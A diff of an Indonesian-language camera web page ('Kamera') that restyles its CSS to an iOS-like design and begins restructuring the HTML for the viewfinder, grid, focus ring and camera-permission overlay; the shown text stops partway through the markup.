@@ -1,1191 +1,1058 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>Kamera</title>
-    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='white'><path d='M12 15.2l-3.5 2.1.9-4-2.9-2.5 3.8-.3L12 7l1.7 3.5 3.8.3-2.9 2.5.9 4z'/></svg>">
-    <style>
-        /* ============================================================
-           KAMERA PRO v11.0 — 2000+ LINES GLASSMORPHISM PREMIUM
-           ============================================================ */
-        :root {
-            --bg: #000000;
-            --glass: rgba(255, 255, 255, 0.07);
-            --glass-border: rgba(255, 255, 255, 0.1);
-            --glass-hover: rgba(255, 255, 255, 0.13);
-            --glass-active: rgba(255, 255, 255, 0.18);
-            --accent: #fcd434;
-            --accent-glass: rgba(252, 212, 52, 0.18);
-            --accent-solid: #ffcc00;
-            --ios-blue: #007aff;
-            --ios-red: #ff3b30;
-            --ios-green: #30d158;
-            --ios-gray: #8e8e93;
-            --blur: blur(28px);
-            --blur-light: blur(16px);
-            --radius-sm: 14px;
-            --radius-md: 20px;
-            --radius-lg: 28px;
-            --radius-xl: 40px;
-            --transition-fast: 0.15s cubic-bezier(0.25, 0.1, 0.25, 1);
-            --transition-smooth: 0.25s cubic-bezier(0.25, 0.1, 0.25, 1);
-            --transition-slow: 0.4s cubic-bezier(0.25, 0.1, 0.25, 1);
-            --shadow-sm: 0 4px 12px rgba(0, 0, 0, 0.35);
-            --shadow-md: 0 8px 24px rgba(0, 0, 0, 0.4);
-            --shadow-lg: 0 12px 36px rgba(0, 0, 0, 0.5);
-        }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no,viewport-fit=cover">
+<meta name="theme-color" content="#000000">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<title>Kamera</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='white'><path d='M12 15.2l-3.5 2.1.9-4-2.9-2.5 3.8-.3L12 7l1.7 3.5 3.8.3-2.9 2.5.9 4z'/></svg>">
+<style>
+/* ============================================================
+   anj
+   ============================================================ */
+:root{
+  --bg:#000;
+  --ios-bg:#0a0a0a;
+  --glass:rgba(120,120,128,.24);
+  --glass-2:rgba(120,120,128,.32);
+  --glass-3:rgba(120,120,128,.48);
+  --separator:rgba(84,84,88,.65);
+  --label:#fff;
+  --label-2:rgba(235,235,245,.6);
+  --label-3:rgba(235,235,245,.3);
+  --fill:rgba(120,120,128,.2);
+  --accent:#ffd60a;
+  --accent-2:#ff9f0a;
+  --red:#ff453a;
+  --green:#32d74b;
+  --blue:#0a84ff;
+  --purple:#bf5af2;
+  --blur:blur(30px) saturate(180%);
+  --blur-light:blur(20px) saturate(160%);
+  --shadow:0 8px 32px rgba(0,0,0,.5);
+  --ease:cubic-bezier(.32,.72,0,1);
+  --spring:cubic-bezier(.34,1.56,.64,1);
+  --safe-top:max(12px,env(safe-area-inset-top,0px));
+  --safe-bot:max(20px,env(safe-area-inset-bottom,0px));
+}
+*{margin:0;padding:0;box-sizing:border-box;user-select:none;-webkit-user-select:none;-webkit-tap-highlight-color:transparent;-webkit-touch-callout:none}
+html,body{height:100%;overflow:hidden;background:#000}
+body{
+  font-family:-apple-system,BlinkMacSystemFont,'SF Pro Display','SF Pro Text','Helvetica Neue',sans-serif;
+  width:100vw;height:100dvh;position:relative;color:#fff;
+  -webkit-font-smoothing:antialiased;
+}
 
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            user-select: none;
-            -webkit-user-select: none;
-            -webkit-tap-highlight-color: transparent;
-            -webkit-touch-callout: none;
-        }
+/* ==================== VIDEO ==================== */
+#vf{position:fixed;inset:0;width:100%;height:100%;object-fit:cover;z-index:1;background:#000}
+#vf.blurred{filter:blur(40px) brightness(.4);transform:scale(1.15);transition:all .4s var(--ease)}
 
-        body {
-            background: var(--bg);
-            font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', 'Helvetica Neue', 'Segoe UI', Roboto, sans-serif;
-            height: 100vh;
-            height: 100dvh;
-            width: 100vw;
-            width: 100dvw;
-            overflow: hidden;
-            touch-action: manipulation;
-            position: relative;
-        }
+/* ==================== PERMISSION OVERLAY ==================== */
+.perm-overlay{
+  position:fixed;inset:0;z-index:9999;background:rgba(0,0,0,.92);
+  backdrop-filter:var(--blur);-webkit-backdrop-filter:var(--blur);
+  display:flex;flex-direction:column;align-items:center;justify-content:center;
+  padding:40px 24px;text-align:center;
+  transition:opacity .6s var(--ease),visibility .6s var(--ease);
+}
+.perm-overlay.hidden{opacity:0;visibility:hidden;pointer-events:none}
+.perm-card{
+  background:rgba(28,28,30,.85);backdrop-filter:var(--blur);-webkit-backdrop-filter:var(--blur);
+  border:.5px solid rgba(255,255,255,.12);border-radius:28px;padding:32px 24px 26px;
+  max-width:320px;width:100%;box-shadow:var(--shadow);
+}
+.logo-glass{
+  width:72px;height:72px;border-radius:18px;
+  background:linear-gradient(135deg,#1c1c1e,#2c2c2e);
+  display:flex;align-items:center;justify-content:center;margin:0 auto 20px;
+  box-shadow:0 8px 24px rgba(0,0,0,.6),inset 0 1px 0 rgba(255,255,255,.1);
+  border:.5px solid rgba(255,255,255,.12);
+}
+.logo-glass svg{width:38px;height:38px;fill:var(--accent);filter:drop-shadow(0 2px 8px rgba(255,214,10,.5))}
+.perm-card h1{font-size:26px;font-weight:700;margin-bottom:6px;letter-spacing:-.6px}
+.perm-card .subtitle{font-size:15px;color:var(--label-2);margin-bottom:4px;line-height:1.4}
+.perm-card .subtitle-small{font-size:13px;color:var(--label-3);margin-bottom:24px}
+.status-row{display:flex;align-items:center;justify-content:center;gap:8px;margin-bottom:16px;min-height:20px}
+.status-dot{width:8px;height:8px;border-radius:50%;background:#48484a;transition:all .3s}
+.status-dot.ready{background:var(--green);box-shadow:0 0 10px var(--green)}
+.status-dot.error{background:var(--red);box-shadow:0 0 10px var(--red)}
+.status-dot.loading{background:var(--accent);animation:pulse .8s ease-in-out infinite}
+@keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.4;transform:scale(1.5)}}
+.status-text{font-size:13px;color:var(--label-2)}
+.error-text{color:var(--red);font-size:12px;min-height:18px;margin-bottom:8px;font-weight:500}
+.btn-ios{
+  background:var(--accent);color:#000;border:none;border-radius:14px;
+  padding:15px 0;width:100%;font-size:17px;font-weight:600;
+  cursor:pointer;letter-spacing:-.2px;transition:all .2s var(--spring);
+  outline:none;-webkit-appearance:none;
+}
+.btn-ios:active{transform:scale(.96);opacity:.8}
+.btn-ios:disabled{opacity:.4;transform:none;cursor:not-allowed}
 
-        /* ============================================================
-           PERMISSION OVERLAY — GLASSMORPHISM
-           ============================================================ */
-        .perm-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: #000000;
-            z-index: 9999;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            padding: 40px 28px;
-            color: #ffffff;
-            text-align: center;
-            transition: opacity var(--transition-slow), visibility var(--transition-slow);
-        }
-        .perm-overlay.hidden {
-            opacity: 0;
-            visibility: hidden;
-            pointer-events: none;
-        }
-        .perm-overlay .logo-glass {
-            width: 84px;
-            height: 84px;
-            border-radius: 50%;
-            background: var(--glass);
-            backdrop-filter: var(--blur);
-            -webkit-backdrop-filter: var(--blur);
-            border: 1.5px solid var(--glass-border);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-bottom: 28px;
-            box-shadow: var(--shadow-md), inset 0 1px 0 rgba(255,255,255,0.05);
-        }
-        .perm-overlay .logo-glass svg {
-            width: 40px;
-            height: 40px;
-            fill: #ffffff;
-            filter: drop-shadow(0 2px 4px rgba(0,0,0,0.3));
-        }
-        .perm-overlay h1 {
-            font-size: 28px;
-            font-weight: 650;
-            margin-bottom: 8px;
-            letter-spacing: -0.4px;
-            line-height: 1.2;
-        }
-        .perm-overlay .subtitle {
-            font-size: 14px;
-            color: var(--ios-gray);
-            margin-bottom: 8px;
-            line-height: 1.5;
-            max-width: 280px;
-        }
-        .perm-overlay .subtitle-small {
-            font-size: 12px;
-            color: #636366;
-            margin-bottom: 30px;
-            line-height: 1.4;
-            max-width: 250px;
-        }
-        .perm-overlay .status-row {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            margin-bottom: 20px;
-            min-height: 26px;
-        }
-        .perm-overlay .status-dot {
-            width: 10px;
-            height: 10px;
-            border-radius: 50%;
-            background: #48484a;
-            transition: background var(--transition-smooth);
-        }
-        .perm-overlay .status-dot.ready { background: var(--ios-green); }
-        .perm-overlay .status-dot.error { background: var(--ios-red); }
-        .perm-overlay .status-dot.loading { background: var(--accent-solid); animation: pulse 0.8s ease-in-out infinite; }
-        @keyframes pulse {
-            0%, 100% { opacity: 1; transform: scale(1); }
-            50% { opacity: 0.5; transform: scale(1.3); }
-        }
-        .perm-overlay .status-text {
-            font-size: 13px;
-            color: #aeaeb2;
-            font-weight: 400;
-        }
-        .perm-overlay .error-text {
-            color: var(--ios-red);
-            font-size: 12px;
-            min-height: 20px;
-            margin-bottom: 8px;
-            font-weight: 500;
-            line-height: 1.4;
-        }
-        .perm-overlay .btn-glass {
-            background: var(--glass);
-            backdrop-filter: var(--blur);
-            -webkit-backdrop-filter: var(--blur);
-            border: 1px solid var(--glass-border);
-            border-radius: 30px;
-            padding: 16px 0;
-            width: 100%;
-            max-width: 300px;
-            font-size: 17px;
-            font-weight: 600;
-            color: #ffffff;
-            cursor: pointer;
-            text-align: center;
-            letter-spacing: 0.1px;
-            transition: all var(--transition-fast);
-            box-shadow: var(--shadow-sm);
-            outline: none;
-            -webkit-appearance: none;
-        }
-        .perm-overlay .btn-glass:active {
-            background: var(--glass-hover);
-            transform: scale(0.96);
-            box-shadow: var(--shadow-md);
-        }
-        .perm-overlay .btn-glass:disabled {
-            opacity: 0.4;
-            transform: none;
-            cursor: not-allowed;
-        }
+/* ==================== FLASH ==================== */
+#flash{position:fixed;inset:0;background:#fff;z-index:100;opacity:0;pointer-events:none}
+#flash.active{animation:flashAnim .28s var(--ease)}
+@keyframes flashAnim{0%{opacity:0}25%{opacity:1}100%{opacity:0}}
 
-        /* ============================================================
-           VIDEO FEED
-           ============================================================ */
-        #vf {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            z-index: 1;
-        }
-        /* NO MIRROR: Kamera depan REAL VIEW */
-        #vf.front-camera {
-    transform: none;
-        }
+/* ==================== GRID ==================== */
+.grid{position:fixed;inset:0;z-index:2;pointer-events:none;display:grid;grid-template-columns:repeat(3,1fr);grid-template-rows:repeat(3,1fr);opacity:0;transition:opacity .3s var(--ease)}
+.grid.show{opacity:1}
+.grid-line{border:.5px solid rgba(255,255,255,.18)}
+.grid.show .grid-line{animation:gridIn 1s var(--ease)}
+@keyframes gridIn{0%{border-color:rgba(255,255,255,0)}100%{border-color:rgba(255,255,255,.18)}}
 
-        /* ============================================================
-           FLASH OVERLAY
-           ============================================================ */
-        #flash-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: #ffffff;
-            z-index: 100;
-            opacity: 0;
-            pointer-events: none;
-            transition: opacity 0.03s ease;
-        }
-        #flash-overlay.active {
-            opacity: 0.92;
-            transition: opacity 0s;
-        }
+/* ==================== FOCUS ==================== */
+.focus{position:fixed;width:76px;height:76px;border:1.5px solid var(--accent);border-radius:8px;transform:translate(-50%,-50%);pointer-events:none;z-index:7;opacity:0}
+.focus.animate{animation:focusAnim .55s var(--spring) forwards}
+@keyframes focusAnim{
+  0%{opacity:1;transform:translate(-50%,-50%) scale(.6)}
+  50%{opacity:1;transform:translate(-50%,-50%) scale(1.15)}
+  100%{opacity:0;transform:translate(-50%,-50%) scale(1.35)}
+}
 
-        /* ============================================================
-           FULLSCREEN PREVIEW — GLASS
-           ============================================================ */
-        .fs-preview {
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            z-index: 200;
-            background: rgba(0, 0, 0, 0.92);
-            backdrop-filter: var(--blur);
-            -webkit-backdrop-filter: var(--blur);
-            display: none;
-            align-items: center;
-            justify-content: center;
-            flex-direction: column;
-        }
-        .fs-preview.show {
-            display: flex;
-        }
-        .fs-preview img {
-            max-width: 95%;
-            max-height: 82vh;
-            object-fit: contain;
-            border-radius: 8px;
-            box-shadow: var(--shadow-lg);
-        }
-        .fs-preview .fs-info {
-            color: var(--ios-gray);
-            font-size: 12px;
-            margin-top: 14px;
-            text-align: center;
-            padding: 0 20px;
-        }
-        .fs-preview .fs-close {
-            position: absolute;
-            top: 20px;
-            right: 20px;
-            width: 42px;
-            height: 42px;
-            border-radius: 50%;
-            background: var(--glass);
-            backdrop-filter: var(--blur-light);
-            -webkit-backdrop-filter: var(--blur-light);
-            border: 1px solid var(--glass-border);
-            color: #ffffff;
-            font-size: 22px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            cursor: pointer;
-            z-index: 201;
-            transition: all var(--transition-fast);
-            box-shadow: var(--shadow-sm);
-        }
-        .fs-preview .fs-close:active {
-            background: var(--glass-hover);
-            transform: scale(0.9);
-        }
+/* ==================== TOP BAR (iOS) ==================== */
+.top-bar{
+  position:fixed;top:0;left:0;right:0;z-index:6;
+  padding:var(--safe-top) 16px 10px;
+  display:flex;justify-content:space-between;align-items:center;
+  pointer-events:none;
+  background:linear-gradient(to bottom,rgba(0,0,0,.6),transparent);
+  transition:opacity .4s var(--ease),transform .4s var(--ease);
+}
+.top-bar.hide{opacity:0;transform:translateY(-12px)}
+.top-bar>*{pointer-events:auto}
+.ios-btn{
+  width:44px;height:44px;border-radius:50%;
+  background:var(--glass);backdrop-filter:var(--blur-light);-webkit-backdrop-filter:var(--blur-light);
+  border:.5px solid rgba(255,255,255,.15);
+  display:flex;align-items:center;justify-content:center;
+  cursor:pointer;transition:all .2s var(--spring);
+  padding:0;outline:none;-webkit-appearance:none;
+}
+.ios-btn:active{transform:scale(.86);background:var(--glass-3)}
+.ios-btn.on{background:rgba(255,214,10,.28);border-color:rgba(255,214,10,.6)}
+.ios-btn.on svg{fill:var(--accent)}
+.ios-btn svg{width:20px;height:20px;fill:#fff;transition:fill .2s;filter:drop-shadow(0 1px 2px rgba(0,0,0,.4))}
 
-        /* ============================================================
-           TOP BAR — GLASS BUTTONS
-           ============================================================ */
-        .top-bar {
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            z-index: 6;
-            padding: 14px 16px;
-            padding-top: max(14px, env(safe-area-inset-top, 0px));
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            pointer-events: none;
-        }
-        .top-bar > * {
-            pointer-events: auto;
-        }
-        .glass-btn {
-            width: 42px;
-            height: 42px;
-            border-radius: 50%;
-            background: var(--glass);
-            backdrop-filter: var(--blur);
-            -webkit-backdrop-filter: var(--blur);
-            border: 1px solid var(--glass-border);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            cursor: pointer;
-            transition: all var(--transition-fast);
-            padding: 0;
-            outline: none;
-            -webkit-appearance: none;
-            box-shadow: var(--shadow-sm);
-        }
-        .glass-btn:active {
-            background: var(--glass-active);
-            transform: scale(0.9);
-            box-shadow: var(--shadow-md);
-        }
-        .glass-btn.on {
-            background: var(--accent-glass);
-            border-color: var(--accent);
-        }
-        .glass-btn.on svg {
-            fill: var(--accent-solid);
-        }
-        .glass-btn svg {
-            width: 19px;
-            height: 19px;
-            fill: #ffffff;
-            transition: fill var(--transition-fast);
-            filter: drop-shadow(0 1px 2px rgba(0,0,0,0.3));
-        }
+/* ==================== ZOOM ==================== */
+.zoom{
+  position:fixed;bottom:158px;left:50%;transform:translateX(-50%);z-index:6;
+  background:rgba(28,28,30,.75);backdrop-filter:var(--blur);-webkit-backdrop-filter:var(--blur);
+  border:.5px solid rgba(255,255,255,.12);border-radius:24px;padding:5px 4px;
+  display:flex;gap:2px;box-shadow:var(--shadow);
+  transition:opacity .4s var(--ease),transform .4s var(--ease);
+}
+.zoom.hide{opacity:0;transform:translate(-50%,16px)}
+.zoom-opt{
+  padding:8px 14px;border-radius:20px;font-size:12px;font-weight:600;color:#fff;
+  cursor:pointer;transition:all .25s var(--spring);text-align:center;min-width:34px;
+  letter-spacing:-.2px;
+}
+.zoom-opt:active{transform:scale(.88)}
+.zoom-opt.active{background:var(--accent);color:#000;font-weight:700;box-shadow:0 2px 10px rgba(255,214,10,.5)}
 
-        /* ============================================================
-           ZOOM WHEEL — GLASS
-           ============================================================ */
-        .zoom-wheel {
-            position: fixed;
-            bottom: 140px;
-            left: 50%;
-            transform: translateX(-50%);
-            z-index: 6;
-            pointer-events: auto;
-            background: var(--glass);
-            backdrop-filter: var(--blur);
-            -webkit-backdrop-filter: var(--blur);
-            border: 1px solid var(--glass-border);
-            border-radius: 26px;
-            padding: 6px 5px;
-            display: flex;
-            gap: 3px;
-            box-shadow: var(--shadow-md);
-        }
-        .zoom-option {
-            padding: 9px 15px;
-            border-radius: 22px;
-            font-size: 13px;
-            font-weight: 500;
-            color: #ffffff;
-            cursor: pointer;
-            transition: all var(--transition-fast);
-            text-align: center;
-            min-width: 36px;
-            outline: none;
-            -webkit-appearance: none;
-        }
-        .zoom-option:active {
-            background: var(--glass-active);
-        }
-        .zoom-option.active {
-            background: rgba(255, 255, 255, 0.22);
-            font-weight: 700;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.3);
-        }
+/* ==================== BOTTOM BAR (iOS) ==================== */
+.bottom-bar{
+  position:fixed;bottom:0;left:0;right:0;z-index:6;
+  padding:10px 24px var(--safe-bot);
+  display:flex;justify-content:space-between;align-items:center;
+  pointer-events:none;
+  background:linear-gradient(to top,rgba(0,0,0,.75),transparent);
+  transition:opacity .4s var(--ease),transform .4s var(--ease);
+}
+.bottom-bar.hide{opacity:0;transform:translateY(12px)}
+.bottom-bar>*{pointer-events:auto}
 
-        /* ============================================================
-           BOTTOM BAR — GLASS
-           ============================================================ */
-        .bottom-bar {
-            position: fixed;
-            bottom: 0;
-            left: 0;
-            right: 0;
-            z-index: 6;
-            padding: 14px 18px;
-            padding-bottom: max(22px, env(safe-area-inset-bottom, 0px));
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            pointer-events: none;
-        }
-        .bottom-bar > * {
-            pointer-events: auto;
-        }
-        .thumb-glass {
-            width: 50px;
-            height: 50px;
-            border-radius: 12px;
-            background: var(--glass);
-            backdrop-filter: var(--blur-light);
-            -webkit-backdrop-filter: var(--blur-light);
-            border: 2px solid var(--glass-border);
-            cursor: pointer;
-            overflow: hidden;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            transition: all var(--transition-fast);
-            flex-shrink: 0;
-            box-shadow: var(--shadow-sm);
-        }
-        .thumb-glass:active {
-            border-color: var(--accent);
-            transform: scale(0.94);
-        }
-        .thumb-glass img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            border-radius: 10px;
-        }
-        .thumb-glass.has-photo {
-            border-color: rgba(255, 255, 255, 0.5);
-            background: transparent;
-        }
-        .thumb-glass .placeholder-icon {
-            width: 23px;
-            height: 23px;
-            fill: rgba(255, 255, 255, 0.2);
-        }
-        .shutter-glass {
-            width: 74px;
-            height: 74px;
-            border-radius: 50%;
-            background: var(--glass);
-            backdrop-filter: var(--blur);
-            -webkit-backdrop-filter: var(--blur);
-            border: 3px solid rgba(255, 255, 255, 0.25);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            cursor: pointer;
-            transition: all var(--transition-fast);
-            flex-shrink: 0;
-            box-shadow: var(--shadow-md);
-        }
-        .shutter-glass:active {
-            transform: scale(0.84);
-            border-color: #ffffff;
-            box-shadow: 0 0 30px rgba(255,255,255,0.2);
-        }
-        .shutter-inner {
-            width: 56px;
-            height: 56px;
-            border-radius: 50%;
-            background: #ffffff;
-            border: 2px solid #000000;
-        }
-        .shutter-spacer {
-            width: 50px;
-            flex-shrink: 0;
-        }
+/* Thumbnail iOS style */
+.thumb{
+  width:56px;height:56px;border-radius:12px;
+  background:var(--glass);backdrop-filter:var(--blur-light);-webkit-backdrop-filter:var(--blur-light);
+  border:1.5px solid rgba(255,255,255,.2);
+  cursor:pointer;overflow:hidden;display:flex;align-items:center;justify-content:center;
+  transition:all .25s var(--spring);flex-shrink:0;
+  box-shadow:0 4px 14px rgba(0,0,0,.4);
+}
+.thumb:active{transform:scale(.9);border-color:rgba(255,255,255,.5)}
+.thumb img{width:100%;height:100%;object-fit:cover}
+.thumb.has{border-color:rgba(255,255,255,.4);background:transparent}
+.thumb .ph{width:24px;height:24px;fill:rgba(255,255,255,.3)}
 
-        /* ============================================================
-           FOCUS RING
-           ============================================================ */
-        .focus-ring {
-            position: fixed;
-            width: 72px;
-            height: 72px;
-            border: 2px solid var(--accent);
-            border-radius: 50%;
-            transform: translate(-50%, -50%);
-            pointer-events: none;
-            z-index: 7;
-            opacity: 0;
-            box-shadow: 0 0 30px rgba(252, 212, 52, 0.4);
-        }
-        .focus-ring.animate {
-            animation: focusAnim 0.55s cubic-bezier(0.25, 0.46, 0.45, 0.94) forwards;
-        }
-        @keyframes focusAnim {
-            0% {
-                opacity: 1;
-                transform: translate(-50%, -50%) scale(0.6);
-            }
-            100% {
-                opacity: 0;
-                transform: translate(-50%, -50%) scale(1.6);
-            }
-        }
+/* Shutter iOS style */
+.shutter{
+  width:76px;height:76px;border-radius:50%;
+  background:transparent;
+  border:4px solid rgba(255,255,255,.85);
+  display:flex;align-items:center;justify-content:center;
+  cursor:pointer;transition:all .15s var(--spring);flex-shrink:0;
+  position:relative;
+  box-shadow:0 0 0 1px rgba(0,0,0,.3);
+}
+.shutter-inner{
+  width:60px;height:60px;border-radius:50%;background:#fff;
+  transition:all .15s var(--spring);
+}
+.shutter:active{transform:scale(.9)}
+.shutter:active .shutter-inner{width:52px;height:52px;background:#d0d0d0}
 
-        /* ============================================================
-           GRID OVERLAY
-           ============================================================ */
-        .grid-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            z-index: 2;
-            pointer-events: none;
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            grid-template-rows: repeat(3, 1fr);
-        }
-        .grid-overlay .grid-line {
-            border: 0.5px solid rgba(255, 255, 255, 0.05);
-        }
-    </style>
+/* Flip / mode button (iOS style pill) */
+.pill-btn{
+  height:56px;min-width:56px;padding:0 16px;border-radius:28px;
+  background:var(--glass);backdrop-filter:var(--blur-light);-webkit-backdrop-filter:var(--blur-light);
+  border:.5px solid rgba(255,255,255,.15);
+  display:flex;align-items:center;justify-content:center;gap:6px;
+  cursor:pointer;transition:all .2s var(--spring);flex-shrink:0;
+  font-size:13px;font-weight:600;color:#fff;letter-spacing:-.2px;
+}
+.pill-btn:active{transform:scale(.9);background:var(--glass-3)}
+.pill-btn svg{width:22px;height:22px;fill:#fff}
+
+/* ==================== TOP MODE BAR (iOS Camera) ==================== */
+.mode-bar{
+  position:fixed;top:calc(var(--safe-top) + 50px);left:0;right:0;z-index:5;
+  display:flex;justify-content:center;gap:24px;
+  pointer-events:none;
+  transition:opacity .4s var(--ease),transform .4s var(--ease);
+}
+.mode-bar.hide{opacity:0;transform:translateY(-8px)}
+.mode-item{
+  font-size:12px;font-weight:600;letter-spacing:.5px;text-transform:uppercase;
+  color:var(--label-3);cursor:pointer;transition:all .25s var(--ease);
+  pointer-events:auto;padding:4px 0;position:relative;
+}
+.mode-item.active{color:var(--accent);font-weight:700;text-shadow:0 0 12px rgba(255,214,10,.5)}
+.mode-item.active::after{
+  content:'';position:absolute;bottom:-4px;left:50%;transform:translateX(-50%);
+  width:4px;height:4px;border-radius:50%;background:var(--accent);
+}
+
+/* ==================== FS PREVIEW (iOS) ==================== */
+.fs{
+  position:fixed;inset:0;z-index:200;background:rgba(0,0,0,.96);
+  backdrop-filter:var(--blur);-webkit-backdrop-filter:var(--blur);
+  display:none;flex-direction:column;align-items:center;justify-content:center;
+  animation:fadeIn .35s var(--ease);
+}
+.fs.show{display:flex}
+@keyframes fadeIn{from{opacity:0}to{opacity:1}}
+.fs-media{max-width:96%;max-height:70vh;object-fit:contain;border-radius:8px;box-shadow:0 20px 60px rgba(0,0,0,.8);animation:zoomIn .4s var(--spring)}
+@keyframes zoomIn{from{transform:scale(.85);opacity:0}to{transform:scale(1);opacity:1}}
+.fs-info{color:var(--label-2);font-size:12px;margin-top:16px;text-align:center;padding:0 20px;white-space:pre-line;line-height:1.6}
+.fs-bar{
+  position:absolute;top:var(--safe-top);left:0;right:0;
+  padding:12px 20px;
+  display:flex;justify-content:space-between;align-items:center;
+  background:linear-gradient(to bottom,rgba(0,0,0,.8),transparent);
+}
+.fs-title{font-size:16px;font-weight:600;letter-spacing:-.3px}
+.fs-toolbar{
+  position:absolute;bottom:var(--safe-bot);left:0;right:0;
+  padding:12px 20px;
+  display:flex;justify-content:space-around;align-items:center;
+  background:linear-gradient(to top,rgba(0,0,0,.8),transparent);
+}
+.fs-tool{
+  display:flex;flex-direction:column;align-items:center;gap:6px;
+  color:var(--label-2);font-size:11px;font-weight:500;
+  cursor:pointer;transition:all .2s var(--spring);
+  padding:8px 12px;border-radius:12px;
+}
+.fs-tool:active{transform:scale(.9);background:var(--glass)}
+.fs-tool svg{width:22px;height:22px;fill:#fff;filter:drop-shadow(0 1px 2px rgba(0,0,0,.5))}
+.fs-tool.primary{color:var(--accent)}
+.fs-tool.primary svg{fill:var(--accent)}
+.fs-tool.danger{color:var(--red)}
+.fs-tool.danger svg{fill:var(--red)}
+
+/* ==================== TOAST ==================== */
+.toast{
+  position:fixed;bottom:190px;left:50%;transform:translate(-50%,16px);
+  background:rgba(28,28,30,.9);backdrop-filter:var(--blur-light);-webkit-backdrop-filter:var(--blur-light);
+  border:.5px solid rgba(255,255,255,.12);border-radius:20px;
+  padding:10px 20px;font-size:13px;font-weight:600;color:#fff;
+  z-index:300;opacity:0;pointer-events:none;
+  transition:all .35s var(--spring);box-shadow:var(--shadow);white-space:nowrap;
+}
+.toast.show{opacity:1;transform:translate(-50%,0)}
+.toast.ok{color:var(--green);border-color:rgba(50,215,75,.4)}
+.toast.err{color:var(--red);border-color:rgba(255,69,58,.4)}
+
+/* ==================== TOP STATUS (iOS pill) ==================== */
+.top-status{
+  position:fixed;top:calc(var(--safe-top) + 4px);left:50%;transform:translateX(-50%);
+  z-index:7;display:flex;gap:4px;align-items:center;
+  background:rgba(28,28,30,.75);backdrop-filter:var(--blur-light);-webkit-backdrop-filter:var(--blur-light);
+  border:.5px solid rgba(255,255,255,.12);border-radius:16px;
+  padding:4px 10px;font-size:10px;font-weight:700;letter-spacing:.8px;color:var(--accent);
+  pointer-events:none;transition:opacity .4s var(--ease);
+}
+.top-status.hide{opacity:0}
+.top-status .dot{width:5px;height:5px;border-radius:50%;background:var(--green);animation:pulse 2s ease-in-out infinite}
+
+/* Haptic feedback simulation */
+.haptic{animation:haptic .15s var(--ease)}
+@keyframes haptic{0%,100%{transform:scale(1)}50%{transform:scale(.97)}}
+</style>
 </head>
 <body>
 
-    <!-- ============================================================
-         PERMISSION OVERLAY
-         ============================================================ -->
-    <div class="perm-overlay" id="permOverlay">
-        <div class="logo-glass">
-            <svg viewBox="0 0 24 24">
-                <path d="M12 15.2l-3.5 2.1.9-4-2.9-2.5 3.8-.3L12 7l1.7 3.5 3.8.3-2.9 2.5.9 4z"/>
-            </svg>
-        </div>
-        <h1>Kamera</h1>
-        <p class="subtitle">Ambil foto berkualitas tinggi</p>
-        <p class="subtitle-small">dengan fitur profesional</p>
-        <div class="status-row">
-            <span class="status-dot" id="statusDot"></span>
-            <span class="status-text" id="statusText">Tekan tombol untuk mulai</span>
-        </div>
-        <div class="error-text" id="errorText"></div>
-        <button class="btn-glass" id="btnStartCamera">Buka Kamera</button>
+<video id="vf" autoplay playsinline muted></video>
+<div id="flash"></div>
+
+<div class="grid" id="grid">
+  <span class="grid-line"></span><span class="grid-line"></span><span class="grid-line"></span>
+  <span class="grid-line"></span><span class="grid-line"></span><span class="grid-line"></span>
+  <span class="grid-line"></span><span class="grid-line"></span><span class="grid-line"></span>
+</div>
+
+<div class="focus" id="focus"></div>
+
+<div class="perm-overlay" id="perm">
+  <div class="perm-card">
+    <div class="logo-glass">
+      <svg viewBox="0 0 24 24"><path d="M12 15.2l-3.5 2.1.9-4-2.9-2.5 3.8-.3L12 7l1.7 3.5 3.8.3-2.9 2.5.9 4z"/></svg>
     </div>
-
-    <!-- ============================================================
-         VIDEO FEED
-         ============================================================ -->
-    <video id="vf" autoplay playsinline muted></video>
-
-    <!-- ============================================================
-         FLASH OVERLAY
-         ============================================================ -->
-    <div id="flash-overlay"></div>
-
-    <!-- ============================================================
-         GRID OVERLAY
-         ============================================================ -->
-    <div class="grid-overlay" id="gridOverlay">
-        <span class="grid-line"></span><span class="grid-line"></span><span class="grid-line"></span>
-        <span class="grid-line"></span><span class="grid-line"></span><span class="grid-line"></span>
-        <span class="grid-line"></span><span class="grid-line"></span><span class="grid-line"></span>
+    <h1>Kamera</h1>
+    <p class="subtitle">Foto & video</p>
+    <p class="subtitle-small">Ini kamera digicam cuma masih tahap penyempurnaan aja</p>
+    <div class="status-row">
+      <span class="status-dot" id="sDot"></span>
+      <span class="status-text" id="sText">Ketuk untuk mulai</span>
     </div>
+    <div class="error-text" id="eText"></div>
